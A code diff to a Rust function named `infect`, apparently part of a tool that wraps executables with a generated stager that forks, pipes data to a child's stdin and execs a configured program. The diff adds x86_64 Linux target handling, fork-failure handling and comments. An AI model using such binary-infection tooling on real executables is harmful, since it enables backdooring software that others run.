@@ -29,8 +29,13 @@ pub async fn infect(bin: &Path, config: &Infect, orig: &[u8]) -> Result<()> {
     let exec_path = config.exec_path();
     let args = config.args(exec_path);
 
-    let target = Some("x86_64-unknown-none");
-    let mut compiler = rust::Compiler::spawn(bin, target).await?;
+    let target = match &config.target {
+        None => "x86_64-unknown-none",
+        Some(target) if target.starts_with("x86_64-unknown-linux-") => "x86_64-unknown-none",
+        Some(unknown) => bail!("Target is not supported yet: {unknown:?}"),
+    };
+
+    let mut compiler = rust::Compiler::spawn(bin, Some(target)).await?;
 
     info!(
         "Generating stager for exec={:?}, argv[0]={:?}, args={:?}",
@@ -167,6 +172,7 @@ pub async fn infect(bin: &Path, config: &Infect, orig: &[u8]) -> Result<()> {
             "pipe(pipefd.as_ptr());\n",
             "let pid = fork();\n",
             "if pid == 0 {\n",
+            // close the sending half of the pipe and connect the receiver to stdin
             "close(pipefd[1]);\n",
             "if dup2(pipefd[0], 0) == -1 { exit(1) }\n",
             // setup exec of child process
@@ -176,9 +182,13 @@ pub async fn infect(bin: &Path, config: &Infect, orig: &[u8]) -> Result<()> {
             &args_src,
             "ptr::null::<u8>()];\n",
             "execve(prog.as_ptr() as *const u8, argv.as_ptr(), envp as *const *const u8);\n",
-            // exit of exec failed
+            // exit if exec failed
             "exit(1);\n",
+            "} else if pid == -1 {\n",
+            // if fork failed, exit
+            "exit(1)\n",
             "} else {\n",
+            // close the receiving half of the pipe and prepare for writing
             "close(pipefd[0]);\n",
             "let f = pipefd[1];\n",
         ])
@@ -188,8 +198,8 @@ pub async fn infect(bin: &Path, config: &Infect, orig: &[u8]) -> Result<()> {
 
     compiler
         .add_lines(&[
+            // close stdin of the child process
             "close(f);\n",
-            "if pid == -1 { exit(1) }\n",
             // wait for child process
             "let wstatus: i32 = 0;\n",
             "loop {\n",
